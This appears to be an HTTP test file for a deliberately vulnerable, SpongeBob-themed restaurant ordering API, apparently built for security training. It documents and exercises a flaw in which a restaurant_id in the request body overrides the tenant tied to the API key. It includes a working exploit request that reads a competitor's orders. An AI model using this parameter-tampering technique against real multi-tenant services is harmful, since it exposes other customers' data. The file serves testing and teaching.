# @import ../_imports.http

# =============================================================================
# VULNERABILITY: R03 Body Override Leaks Competitor Orders (query vs body confusion)
# =============================================================================
#
# DESCRIPTION:
#   The list_orders() handler uses bind_to_restaurant() to "auto-detect"
#   restaurant_id from query params, form data, AND JSON body. This overrides
#   the restaurant_id from the API key authentication. An attacker can send
#   their own API key but specify a competitor's restaurant_id in the body.
#
# ATTACK SCENARIO:
#   Plankton (Chum Bucket owner):
#   1. Authenticates with his Chum Bucket API key (restaurant_id=2)
#   2. Sends GET /orders with JSON body: {"restaurant_id": 1}
#   3. bind_to_restaurant() extracts restaurant_id=1 from body
#   4. Handler overrides g.restaurant_id with body value
#   5. Plankton sees all Krusty Krab orders
#
# IMPACT:
#   Cross-tenant data disclosure. Any authenticated restaurant manager can
#   read any other restaurant's orders, including customer data.
#
# STATUS: VULNERABLE in v304 (exploit succeeds)
#         When fixed (v305+), this test should be excluded.
# =============================================================================

# =============================================================================
# SETUP: Create some orders at Krusty Krab
# =============================================================================

### Seed the database with fresh state
# @name seed
{{
  await platform.seed();
}}
# @ucskip
# @tag orders, r03, v304, vulnerable
GET /orders
X-API-Key: {{auth.restaurant("krusty_krab")}}


### SpongeBob places an order at Krusty Krab
# @name spongebob_order
# @forceRef seed
{{
  const cookie = await auth.login("spongebob");
  exports.spongebobCookie = cookie;
}}
# @tag orders, r03, v304, vulnerable
POST /cart
Cookie: {{spongebobCookie}}
Content-Type: application/json

{ "restaurant_id": 1 }


### Add item to cart
# @name add_item
# @forceRef spongebob_order
# @tag orders, r03, v304, vulnerable
POST /cart/{{$(spongebob_order).field("cart_id")}}/items
Cookie: {{spongebobCookie}}
Content-Type: application/json

{ "item_id": 1 }


### Checkout
# @name checkout
# @forceRef add_item
# @tag orders, r03, v304, vulnerable
POST /cart/{{$(spongebob_order).field("cart_id")}}/checkout
Cookie: {{spongebobCookie}}
Content-Type: application/json

{ "delivery_address": "124 Conch Street" }


# =============================================================================
# EXPLOIT: Chum Bucket reads Krusty Krab orders via body override
# =============================================================================

### Plankton verifies his Chum Bucket key only shows Chum Bucket orders
# @name baseline
# @forceRef checkout
# @tag orders, r03, v304, vulnerable
GET /orders
X-API-Key: {{auth.restaurant("chum_bucket")}}

# Baseline: Should see no orders (Chum Bucket has none)
?? js $(response).isOk() == true


### EXPLOIT: Plankton sends restaurant_id=1 in JSON body
# The API key says "Chum Bucket" but the body says "Krusty Krab"
# @name exploit
# @forceRef baseline
# @tag orders, r03, v304, vulnerable
GET /orders
X-API-Key: {{auth.restaurant("chum_bucket")}}
Content-Type: application/json

{ "restaurant_id": 1 }

# VULNERABLE: Exploit succeeds - Chum Bucket sees Krusty Krab orders
?? js $(response).isOk() == true
?? js $(response).count() > 0
?? js $(response).body().some(o => o.restaurant_id === 1) == true
